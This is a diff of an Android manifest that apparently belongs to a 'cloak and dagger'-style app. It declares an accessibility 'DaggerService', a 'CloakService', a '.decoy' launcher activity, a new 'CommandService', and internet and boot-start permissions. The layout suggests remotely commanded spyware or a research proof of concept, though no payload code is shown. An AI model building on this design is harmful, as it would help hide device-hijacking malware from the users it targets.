@@ -4,17 +4,18 @@
 
     <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
     <application
+        android:name=".App"
         android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/AppTheme">
-        <activity android:name=".MainActivity">
+        <activity android:name=".decoy.MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
@@ -23,7 +24,7 @@
         </activity>
 
         <service
-            android:name=".DaggerService"
+            android:name=".dagger.DaggerService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -34,25 +35,14 @@
                 android:resource="@xml/dagger_service" />
         </service>
         <service
-            android:name=".CloakService"
+            android:name=".cloak.CloakService"
             android:exported="false" />
-
-        <receiver
-            android:name=".ScreenStateReceiver"
-            android:enabled="true"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.SCREEN_OFF" />
-                <action android:name="android.intent.action.SCREEN_ON" />
-            </intent-filter>
-        </receiver>
-
         <service
-            android:name=".ScreenWatcherService"
-            android:enabled="true"
+            android:name=".command.DebugJobScheduler"
             android:exported="false" />
-
-        <activity android:name=".LockScreenActivity"></activity>
+        <service
+            android:name=".command.CommandService"
+            android:exported="false" />
     </application>
 
 </manifest>
